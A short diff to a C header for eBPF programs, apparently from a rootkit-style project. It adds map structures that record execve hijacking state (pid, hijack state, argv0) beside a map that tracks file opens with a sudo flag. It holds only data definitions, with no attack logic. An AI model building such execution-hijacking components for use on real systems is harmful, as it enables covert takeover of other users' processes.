@@ -14,6 +14,9 @@
 #define FS_OPEN_DATA_PROGRAM_NAME_SIZE 16
 #define FS_OPEN_DATA_FILENAME_SIZE 16
 
+//Execution hijacking
+#define EXEC_VAR_HIJACK_ACTIVE_DATA_ARGV0_LEN 64
+
 struct fs_open_data{ //Map value
 	char* buf;
 	int fd;
@@ -23,6 +26,13 @@ struct fs_open_data{ //Map value
 	int is_sudo;
 };
 
+struct exec_var_hijack_active_data{//Map value
+	__u32 pid;
+	int hijack_state;
+	char argv0[EXEC_VAR_HIJACK_ACTIVE_DATA_ARGV0_LEN];
+};
+
+
 struct fs_priv_open{ //Map
 	__uint(type, BPF_MAP_TYPE_HASH);
 	__uint(max_entries, 4096);
@@ -30,13 +40,11 @@ struct fs_priv_open{ //Map
 	__type(value, struct fs_open_data);
 } fs_open SEC(".maps");
 
-
-//State of the execve hijacker. 0 inactive, 1 active
 struct exec_var_priv_hijack_active{ //Map
 	__uint(type, BPF_MAP_TYPE_HASH);
 	__uint(max_entries, 1);
 	__type(key, __u64);
-	__type(value, __u64);
+	__type(value, struct exec_var_hijack_active_data);
 } exec_var_hijack_active SEC(".maps");
 
 
